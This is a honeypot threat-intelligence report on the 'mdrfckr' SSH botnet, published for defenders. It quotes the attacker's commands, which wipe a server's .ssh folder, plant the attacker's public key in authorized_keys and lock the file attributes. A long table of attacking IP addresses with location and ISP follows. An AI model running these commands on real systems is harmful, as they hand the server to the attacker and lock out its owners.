# Honeypot IoC Report 1 - 'mdrfckr' Botnet 
The adversary attempts to expand their botnet by:
1. Attempting to log into SSH servers with the `root` user and weak passwords
2. Removing the `.ssh` folder in the home directory
3. Create a new `.ssh` folder and add their own SSH key
4. Set permissions of `.ssh` folder

**Command IoCs:**

```bash
cd ~ &&
rm -rf .ssh &&
mkdir .ssh &&
echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys &&
chmod -R go= ~/.ssh &&
cd ~
```

```bash
cd ~; chattr -ia .ssh; lockr -ia .ssh
```

**IP IoCs:**

|IP Address     |Country        |City                   |Region                             |ISP                                                     |Org                                                     |
|---------------|---------------|-----------------------|-----------------------------------|--------------------------------------------------------|--------------------------------------------------------|
|182.229.12.141 |South Korea    |Seongnam-si            |Gyeonggi-do                        |LG POWERCOMM                                            |LG POWERCOMM                                            |
|111.235.212.247|Taiwan         |New Taipei City        |New Taipei City                    |Taiwan Intelligent Fiber Optic Network Co., Ltd.        |TAIFO                                                   |
|187.190.58.228 |Mexico         |Mazatlán               |Sinaloa                            |Total Play Telecomunicaciones SA De CV                  |Total Play Telecomunicaciones SA De CV                  |
|119.75.106.18  |South Korea    |Jeonju                 |Jeollabuk-do                       |SK Broadband Co Ltd                                     |TBROAD Jeonju                                           |
|201.149.49.146 |Mexico         |Monterrey              |Nuevo León                         |Megacable Comunicaciones de Mexico, S.A. de C.V.        |Megacable Comunicaciones de Mexico, S.A. de C.V         |
|176.109.0.30   |Russia         |Grozny                 |Chechnya                           |FGUP-ELEKTROSVYAZ                                       |Federal State Unitary Enterprise ELEKTROSVYAZ           |
|45.119.81.249  |Vietnam        |Quận Một               |Ho Chi Minh                        |Long Van System Solution                                |Unknown                                                 |
|192.210.135.20 |United States  |Buffalo                |New York                           |ColoCrossing                                            |New Wave NetConnect, LLC                                |
|103.152.18.138 |Bangladesh     |Rangpur City           |Rangpur Division                   |Deshnet Broadband                                       |Deshnet Broadband                                       |
|103.186.1.80   |Indonesia      |Sukabumi               |West Java                          |PT Cloud Hosting Indonesia                              |CV Ansa Project                                         |
|167.86.81.130  |Germany        |Nuremberg              |Bavaria                            |Contabo GmbH                                            |Contabo GmbH                                            |
|176.196.236.146|Russia         |Kemerovo               |Kemerovo Oblast                    |Goodline.info                                           |Unknown                                                 |
|143.110.253.119|India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|51.195.103.245 |Germany        |Limburg an der Lahn    |Hesse                              |OVH SAS                                                 |OVH GmbH                                                |
|103.140.72.172 |India          |Kalyān                 |Maharashtra                        |Citylink Broadbnad Services Pvt. Ltd                    |Citylink Broadbnad Services Pvt Ltd                     |
|189.112.0.11   |Brazil         |São Paulo              |São Paulo                          |ALGAR TELECOM S/A                                       |ALGAR TELECOM S/A                                       |
|91.239.19.66   |Russia         |Ulyanovsk              |Ulyanovsk Oblast                   |Telecom.ru Ltd                                          |Telecom.ru Ltd                                          |
|143.110.238.119|United States  |Santa Clara            |California                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|42.123.115.126 |China          |Beijing                |Beijing                            |Cloud Computing Corporation                             |Cloud Computing Branch Corporation                      |
|191.98.191.214 |Peru           |Lima                   |Lima Province                      |Optical Technologies S.A.C.                             |Ministerio De Trabajo Y Promocion Del Empleo            |
|156.254.115.235|Hong Kong      |Hong Kong              |Kowloon                            |StepGo Limited                                          |StepGo Limited                                          |
|121.17.75.230  |China          |Zhangjiakou            |Hebei                              |CNC Group CHINA169 Hebei Province Network               |Unknown                                                 |
|51.83.250.33   |Poland         |Warsaw                 |Mazovia                            |OVH SAS                                                 |OVH Sp. z o. o                                          |
|222.98.122.37  |South Korea    |Hwaseong-si            |Gyeonggi-do                        |Korea Telecom                                           |Korea Telecom                                           |
|45.55.131.143  |United States  |Clifton                |New Jersey                         |DigitalOcean, LLC                                       |Digital Ocean                                           |
|175.24.33.7    |China          |Shanghai               |Shanghai                           |Shenzhen Tencent Computer Systems Company Limited       |Tencent cloud computing (Beijing) Co., Ltd.             |
|103.186.1.115  |Indonesia      |Sukabumi               |West Java                          |PT Cloud Hosting Indonesia                              |CV Ansa Project                                         |
|183.239.25.115 |China          |Guangzhou              |Guangdong                          |China Mobile                                            |China Mobile Communications Corporation                 |
|189.241.3.14   |Mexico         |Tláhuac                |Mexico City                        |Uninet S.A. de C.V.                                     |UNINET                                                  |
|150.109.244.181|South Korea    |Seoul                  |Seoul                              |Aceville Pte.ltd                                        |Unknown                                                 |
|156.67.26.156  |Germany        |Düsseldorf             |North Rhine-Westphalia             |Contabo GmbH                                            |Contabo GmbH                                            |
|14.225.206.98  |Vietnam        |Hanoi                  |Hanoi                              |Vietnam Posts and Telecommunications Group              |VNPT                                                    |
|54.37.228.73   |France         |Roubaix                |Hauts-de-France                    |OVH SAS                                                 |OVH                                                     |
|213.6.203.226  |Palestine      |Gaza                   |Gaza Governorate                   |Palestine Telecommunications Company                    |Palestine Telecommunications Company                    |
|147.182.171.30 |United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|101.43.32.155  |China          |Haidian                |Beijing                            |Shenzhen Tencent Computer Systems Company Limited       |Tencent Cloud Computing (Beijing) Co., Ltd              |
|112.165.212.156|South Korea    |Cheongju-si            |North Chungcheong                  |Korea Telecom                                           |Kornet                                                  |
|37.60.248.127  |Germany        |Düsseldorf             |North Rhine-Westphalia             |SiteGround                                              |Unknown                                                 |
|182.18.161.165 |India          |Hyderabad              |Telangana                          |CtrlS                                                   |Pioneer Elabs Ltd.                                      |
|24.199.113.111 |United States  |Santa Clara            |California                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|111.70.43.42   |Taiwan         |Taipei                 |Taiwan                             |EMOME                                                   |Chunghwa Telecom Co. Ltd.                               |
|54.39.18.122   |Canada         |Beauharnois            |Quebec                             |OVH SAS                                                 |OVH Hosting, Inc.                                       |
|103.206.72.2   |Indonesia      |Bogor                  |West Java                          |PT Milenial Inti Telekomunikasi                         |PT Jaya Guna Mandiri Hasbi                              |
|206.189.229.70 |United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|45.250.0.90    |India          |New Delhi              |National Capital Territory of Delhi|NIXI-CSC                                                |Unknown                                                 |
|199.195.248.117|United States  |New York               |New York                           |FranTech Solutions                                      |FranTech Solutions                                      |
|125.124.156.244|China          |Hangzhou               |Zhejiang                           |Chinanet                                                |Unknown                                                 |
|107.150.119.46 |Hong Kong      |Hong Kong              |Kowloon                            |Zenlayer Inc                                            |UCLOUD                                                  |
|116.204.182.114|Thailand       |Don Mueang City        |Bangkok                            |Bangmod Enterprise Co., Ltd.                            |Bangmod Enterprise Co., Ltd.                            |
|121.228.47.211 |China          |Nanjing                |Jiangsu                            |Chinanet                                                |Chinanet JS                                             |
|203.57.228.175 |China          |Guangzhou              |Guangdong                          |Cloud Computing Corporation                             |Chinanet GD                                             |
|223.113.121.94 |China          |Qinnan                 |Jiangsu                            |China Mobile communications corporation                 |China Mobile                                            |
|185.248.163.129|The Netherlands|Amsterdam              |North Holland                      |NForce Entertainment B.V.                               |SeedVPS                                                 |
|103.125.162.82 |India          |Hyderabad              |Telangana                          |CtrlS                                                   |Tshah Networks Private Limited                          |
|43.128.88.244  |Singapore      |Singapore              |North West                         |Aceville Pte.ltd                                        |Unknown                                                 |
|103.236.253.29 |China          |Quzhou                 |Zhejiang                           |Kaopu Cloud                                             |Unknown                                                 |
|101.91.212.75  |China          |Shanghai               |Shanghai                           |China Telecom (Group)                                   |Chinanet SH                                             |
|61.220.69.14   |Taiwan         |Shulin District        |New Taipei City                    |Chunghwa Telecom Co., Ltd.                              |Chunghwa Telecom Co. Ltd.                               |
|152.32.201.225 |Japan          |Tokyo                  |Tokyo                              |UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED              |Ucloud Information Technology (hk) Limited              |
|67.205.132.176 |United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |Digital Ocean                                           |
|93.118.106.118 |Iran           |Tehran                 |Tehran                             |Telecommunication Company of Iran                       |Telecommunication Company of Tehran                     |
|82.207.8.198   |Ukraine        |Kyiv                   |Kyiv City                          |UKRTELECOM                                              |JSC Ukrtelecom                                          |
|180.103.124.67 |China          |Nanjing                |Jiangsu                            |Chinanet                                                |Chinanet JS                                             |
|190.85.108.189 |Colombia       |Bogotá                 |Bogota D.C.                        |Telmex Colombia S.A.                                    |Telmex Colombia S.A                                     |
|125.74.48.7    |China          |Zhangyelu              |Gansu                              |China Telecom                                           |Chinanet GS                                             |
|114.8.146.58   |Indonesia      |Jakarta                |Jakarta                            |PT. INDOSAT Tbk                                         |PT. INDOSAT Tbk                                         |
|206.189.22.29  |United Kingdom |Slough                 |England                            |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|89.165.1.36    |Iran           |Shiraz                 |Fars                               |Parvaresh Dadeha Co. Private Joint Stock                |DPCO                                                    |
|186.23.239.43  |Argentina      |Buenos Aires           |Buenos Aires                       |Telecentro S.A.                                         |Telecentro S.A                                          |
|103.176.79.117 |Indonesia      |Cicurug                |West Java                          |PT Cloud Hosting Indonesia                              |PT. AwanBit Data Indonesia                              |
|138.68.161.220 |United Kingdom |Slough                 |England                            |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|68.183.95.138  |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|1.238.106.229  |South Korea    |Yongin-si              |Gyeonggi-do                        |SK Broadband Co Ltd                                     |broadNnet                                               |
|14.238.90.66   |Vietnam        |Ho Chi Minh City       |Ho Chi Minh                        |VNPT                                                    |Vietnam Posts and Telecommunications Group              |
|111.88.4.68    |Pakistan       |Bahawalpur             |Punjab                             |Connect Communication                                   |Worldcall Multimedia Limited                            |
|103.251.252.24 |India          |Mumbai                 |Maharashtra                        |Writer Business Services Private Limited                |Writer Business Services Private Limited                |
|206.189.230.76 |United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|190.129.60.125 |Bolivia        |Cochabamba             |Departamento de Cochabamba         |Entel S.A. - EntelNet                                   |Entel S.A. - EntelNet                                   |
|65.73.231.122  |United States  |Victor                 |New York                           |Frontier Communications Solutions                       |Global Communications Solutions                         |
|51.178.43.161  |France         |Gravelines             |Hauts-de-France                    |OVH SAS                                                 |OVH                                                     |
|14.225.19.18   |Vietnam        |Hanoi                  |Hanoi                              |Vietnam Posts and Telecommunications Group              |VNPT                                                    |
|61.222.211.114 |Taiwan         |New Taipei City        |New Taipei City                    |Chunghwa Telecom Co., Ltd.                              |Chunghwa Telecom Co. Ltd.                               |
|165.22.217.96  |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|217.133.40.143 |Italy          |Milan                  |Lombardy                           |Tiscali Italia SpA                                      |Tiscali Italia SpA                                      |
|158.69.194.208 |Canada         |Montreal               |Quebec                             |OVH SAS                                                 |OVH Hosting, Inc                                        |
|209.97.186.17  |United Kingdom |Slough                 |England                            |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|190.147.74.64  |Colombia       |Pereira                |Risaralda Department               |Telmex Colombia S.A.                                    |Telmex Colombia S.A.                                    |
|64.227.130.24  |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|118.25.182.143 |China          |Shanghai               |Shanghai                           |Shenzhen Tencent Computer Systems Company Limited       |Tencent Cloud Computing (Beijing) Co., Ltd              |
|176.124.209.239|Russia         |St Petersburg          |St.-Petersburg                     |TimeWeb Ltd.                                            |TimeWeb Ltd                                             |
|146.59.250.225 |France         |Gravelines             |Hauts-de-France                    |OVH SAS                                                 |OVH                                                     |
|35.224.42.65   |United States  |Council Bluffs         |Iowa                               |Google LLC                                              |Google Cloud (us-central1)                              |
|177.149.111.36 |Brazil         |Manaus                 |Amazonas                           |TIM S/A                                                 |Tim Celular S.A.                                        |
|37.193.143.34  |Russia         |Novosibirsk            |Novosibirsk Oblast                 |Novotelecom Ltd                                         |Novotelecom ltd.                                        |
|207.154.228.201|Germany        |Frankfurt am Main      |Hesse                              |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|124.225.202.31 |China          |Haikou                 |Hainan                             |Hainan Network of ChinaTelecom                          |Unknown                                                 |
|167.71.223.38  |Singapore      |Singapore              |South West                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|195.24.56.135  |Bulgaria       |Sofia                  |Sofia-Capital                      |A1 Bulgaria EAD                                         |Orbitel customer and internal                           |
|138.197.31.247 |United States  |Clifton                |New Jersey                         |DigitalOcean, LLC                                       |Digital Ocean                                           |
|220.134.146.222|Taiwan         |Hsinchu County         |Hsinchu County                     |Chunghwa Telecom Co., Ltd.                              |Chunghwa Telecom Co. Ltd.                               |
|179.165.82.251 |Brazil         |São Paulo              |São Paulo                          |Vivo                                                    |TELEF�NICA BRASIL S.A                                   |
|42.51.39.163   |China          |Zhengzhou              |Henan                              |China Unicom Henan Province network                     |Henan Telcom Union Technology Co., LTD                  |
|220.80.223.144 |South Korea    |Yeosu                  |Jeollanam-do                       |Korea Telecom                                           |Kornet                                                  |
|147.182.243.103|United States  |Santa Clara            |California                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|36.66.66.195   |Indonesia      |Jakarta                |Jakarta                            |PT. Telekomunikasi Indonesia                            |Unknown                                                 |
|170.79.37.84   |Peru           |Santa Anita - Los Ficus|Lima region                        |Telefonica del Peru S.A.A.                              |Telefonica del Peru S.A.A                               |
|183.110.116.96 |South Korea    |Seongnam-si            |Gyeonggi-do                        |Korea Telecom                                           |Korea Telecom                                           |
|219.85.18.6    |Taiwan         |Taipei                 |Taipei City                        |Sony Network Taiwan Limited                             |SONET                                                   |
|139.59.38.44   |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|3.111.61.239   |India          |Mumbai                 |Maharashtra                        |Amazon Technologies Inc.                                |AWS EC2 (ap-south-1)                                    |
|117.50.51.198  |China          |Beijing                |Beijing                            |UCLOUD                                                  |Shanghai UCloud Information Technology Company Limited  |
|195.24.66.226  |Russia         |Moscow                 |Moscow                             |JSC "RU-CENTER"                                         |CENTER TE                                               |
|68.178.206.226 |United States  |Tempe                  |Arizona                            |GoDaddy.com, LLC                                        |GoDaddy.com, LLC                                        |
|189.217.130.86 |Mexico         |Magdalena Contreras    |Mexico City                        |Cablevisión, S.A. de C.V.                               |Cablevisión, S.A. de C.V                                |
|144.126.192.64 |United Kingdom |Slough                 |England                            |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|103.77.242.95  |Vietnam        |Cái Răng               |Can Tho                            |Vpsmmo Company Limited                                  |Vpsmmo Company Limited                                  |
|120.28.193.113 |Philippines    |Cagayan de Oro         |Northern Mindanao                  |Globe Telecom                                           |Unknown                                                 |
|103.214.112.35 |Indonesia      |Jakarta                |Jakarta                            |PT Cloud Hosting Indonesia                              |PT Denbe Anugerah Solusindo                             |
|36.255.159.130 |India          |Vapi                   |Gujarat                            |Dishawaves Infonet Pvt. Ltd                             |Dishawaves Infonet Pvt. LTD                             |
|139.59.35.6    |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|175.6.71.80    |China          |Qingyuan               |Hunan                              |No.293, Wanbao Avenue                                   |Chinanet HN                                             |
|161.97.165.124 |Germany        |Düsseldorf             |North Rhine-Westphalia             |Contabo GmbH                                            |Contabo GmbH                                            |
|68.183.88.186  |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|185.239.69.239 |The Netherlands|Amsterdam              |North Holland                      |IT7 Networks Inc                                        |Unknown                                                 |
|118.70.48.219  |Vietnam        |Hanoi                  |Hanoi                              |FPT Telecom Company                                     |FPT-STATICIP                                            |
|51.81.34.144   |United States  |Reston                 |Virginia                           |OVH SAS                                                 |OVH US LLC                                              |
|165.227.245.17 |Germany        |Frankfurt am Main      |Hesse                              |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|67.59.72.109   |United States  |Redmond                |Oregon                             |LS Networks                                             |Quantum Communications LLC                              |
|5.202.9.106    |Iran           |Tehran                 |Tehran                             |Pishgaman Toseeh Ertebatat Company (Private Joint Stock)|Pishgaman Toseeh Ertebatat Company (Private Joint Stock)|
|117.33.146.102 |China          |Liuxiang               |Shanxi                             |CHINANET SHAANXI province Cloud Base network            |Chinanet SN                                             |
|61.171.46.131  |China          |Shanghai               |Shanghai                           |China Telecom (Group)                                   |Chinanet SH                                             |
|93.93.115.178  |Spain          |Madrid                 |Madrid                             |IONOS SE                                                |Arsys Internet S.L.U                                    |
|191.98.191.87  |Peru           |Lima                   |Lima Province                      |Optical Technologies S.A.C.                             |Ministerio De Trabajo Y Promocion Del Empleo            |
|187.136.160.172|Mexico         |Heroica Matamoros      |Tamaulipas                         |Uninet S.A. de C.V.                                     |UNINET                                                  |
|157.66.81.127  |Vietnam        |Quận Năm               |Ho Chi Minh                        |CLOUDWP                                                 |CLOUD WP Technology One Member LLC                      |
|103.3.247.81   |Vietnam        |Quận Tân Phú           |Ho Chi Minh                        |VDATA                                                   |New Vision Trading Co., Ltd                             |
|101.35.19.119  |China          |Haidian                |Beijing                            |Shenzhen Tencent Computer Systems Company Limited       |Tencent Cloud Computing (Beijing) Co., Ltd              |
|165.232.178.225|India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|103.189.234.253|Singapore      |Singapore              |Central Singapore                  |Cloud Host Pte Ltd                                      |Cloud Host Pte Ltd                                      |
|37.187.103.145 |France         |Roubaix                |Hauts-de-France                    |OVH SAS                                                 |OVH SAS                                                 |
|177.197.234.249|Brazil         |São José dos Campos    |São Paulo                          |Vivo                                                    |TELEF�NICA BRASIL S.A                                   |
|220.196.192.67 |China          |Shanghai               |Shanghai                           |China Unicom Network                                    |Unknown                                                 |
|196.188.248.179|Ethiopia       |Addis Ababa            |Addis Ababa                        |Ethiotelecom                                            |Unknown                                                 |
|103.53.166.226 |India          |Bengaluru              |Karnataka                          |CCS Broadband 53166 SURAT                               |Ishan Netsol Pvt Ltd                                    |
|190.181.4.12   |Bolivia        |La Paz                 |La Paz Department                  |AXS Bolivia S. A                                        |Bios System SRL                                         |
|85.245.107.230 |Portugal       |Lisbon                 |Lisbon                             |PT Comunicacoes S.A.                                    |PT Comunicacoes S.A.                                    |
|36.99.44.86    |China          |Zhengzhou              |Henan                              |China Telecom                                           |Chinanet HA                                             |
|135.125.107.75 |France         |Paris                  |Île-de-France                      |OVH SAS                                                 |OVH                                                     |
|164.92.157.100 |The Netherlands|Amsterdam              |North Holland                      |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|41.223.124.122 |Mozambique     |Maputo                 |Cidade de Maputo                   |NextNet Network                                         |Unknown                                                 |
|220.86.29.35   |South Korea    |Gangseo-gu             |Seoul                              |Korea Telecom                                           |Korea Telecom                                           |
|120.70.96.30   |China          |Xingfulu               |Xinjiang                           |CHINATELECOM Xinjiang Wulumuqi MAN network              |Chinanet XJ                                             |
|122.154.48.30  |Thailand       |Hat Yai                |Songkhla                           |CAT Telecom Public Company Limited                      |National Telecom Public Company Limited                 |
|54.37.73.222   |Germany        |Saarbrücken            |Saarland                           |OVH SAS                                                 |OVH GmbH                                                |
|103.171.85.22  |Indonesia      |Cicurug                |West Java                          |PT Cloud Hosting Indonesia                              |PT Cloud Hosting Indonesia                              |
|49.64.169.153  |China          |Nanjing                |Jiangsu                            |Chinanet                                                |Chinanet JS                                             |
|90.239.30.219  |Sweden         |Stockholm              |Stockholm County                   |Telia Company AB                                        |Telia Network Services                                  |
|134.209.150.62 |India          |Bengaluru              |Karnataka                          |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|15.235.199.158 |Singapore      |Singapore              |Central Singapore                  |OVH SAS                                                 |OVH Singapore PTE. LTD                                  |
|197.243.14.52  |Rwanda         |Kigali                 |Kigali                             |BSC                                                     |Unknown                                                 |
|103.98.176.140 |Indonesia      |Rejosari               |Central Java                       |Universitas PGRI Semarang                               |Universitas PGRI Semarang                               |
|45.182.167.237 |Brazil         |Maripá de Minas        |Minas Gerais                       |Fourlink Telecom Serviços de Telecomunicações Ltda      |Fourlink Telecom Serviços de Telecomunicações Ltda      |
|91.205.128.170 |Russia         |Makhachkala            |Dagestan                           |LTD "Erline"                                            |R-Line Ltd                                              |
|144.34.212.238 |United States  |Los Angeles            |California                         |IT7 Networks Inc                                        |Cluster Logic Inc                                       |
|125.124.74.56  |China          |Hangzhou               |Zhejiang                           |Chinanet                                                |Unknown                                                 |
|82.157.63.72   |China          |Beijing                |Beijing                            |Shenzhen Tencent Computer Systems Company Limited       |Tencent Cloud Computing (Beijing) Co., Ltd              |
|159.223.45.100 |Singapore      |Singapore              |South West                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|174.138.10.205 |The Netherlands|Amsterdam              |North Holland                      |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|27.128.174.164 |China          |Shijiazhuang           |Hebei                              |Chinanet                                                |Chinanet HE                                             |
|180.148.213.132|Bangladesh     |Dhaka                  |Dhaka Division                     |STARGATE                                                |Stargate Communications Ltd.                            |
|122.34.166.68  |South Korea    |Yuseong-gu             |Daejeon                            |LG POWERCOMM                                            |Xpeed                                                   |
|35.241.84.62   |Hong Kong      |Hong Kong              |Central and Western District       |Google LLC                                              |Google Cloud (asia-east2)                               |
|36.46.159.244  |China          |Xincheng               |Shaanxi                            |CHINANET SHAANXI province Cloud Base network            |Chinanet SN                                             |
|49.36.43.178   |India          |Nagpur                 |Maharashtra                        |Reliance Jio Infocomm Limited                           |Reliance Jio Infocomm Limited                           |
|102.214.168.132|Somalia        |Mogadishu              |Banaadir                           |Somtel Somalia LTD                                      |Somtel Somalia LTD                                      |
|167.172.157.140|United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|114.219.56.217 |China          |Nanjing                |Jiangsu                            |Chinanet                                                |Chinanet JS                                             |
|187.110.238.50 |Brazil         |Fortaleza              |Ceará                              |DB3 SERVICOS DE TELECOMUNICACOES S.A                    |DB3 SERVICOS DE TELECOMUNICACOES S.A                    |
|103.130.215.82 |Vietnam        |Hanoi                  |Hanoi                              |P815                                                    |Unknown                                                 |
|45.117.32.230  |Mongolia       |Ulan Bator             |Ulaanbaatar Hot                    |Mobinet LLC                                             |Unknown                                                 |
|43.134.34.122  |Singapore      |Singapore              |North West                         |Shenzhen Tencent Computer Systems Company Limited       |Tencent Cloud Computing                                 |
|113.161.252.70 |Vietnam        |Ho Chi Minh City       |Ho Chi Minh                        |VietNam Post and Telecom Corporation                    |Vietnam Posts and Telecommunications Group              |
|149.78.186.161 |Brazil         |Barueri                |São Paulo                          |Qnax Ltda                                               |Qnax Ltda                                               |
|193.95.30.6    |Tunisia        |Tunis                  |Tunis Governorate                  |CCK                                                     |ATI - Agence Tunisienne Internet                        |
|52.172.162.64  |India          |Pune                   |Maharashtra                        |Microsoft Corporation                                   |Microsoft Azure Cloud (centralindia)                    |
|142.93.51.142  |United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |
|118.43.95.157  |South Korea    |Gimje-si               |Jeollabuk-do                       |Korea Telecom                                           |Kornet                                                  |
|152.42.160.220 |Singapore      |Singapore              |South West                         |DigitalOcean, LLC                                       |Digital Ocean                                           |
|134.122.114.194|United States  |North Bergen           |New Jersey                         |DigitalOcean, LLC                                       |DigitalOcean, LLC                                       |

[Independent CTI Homepage](https://independent-cti.github.io/)
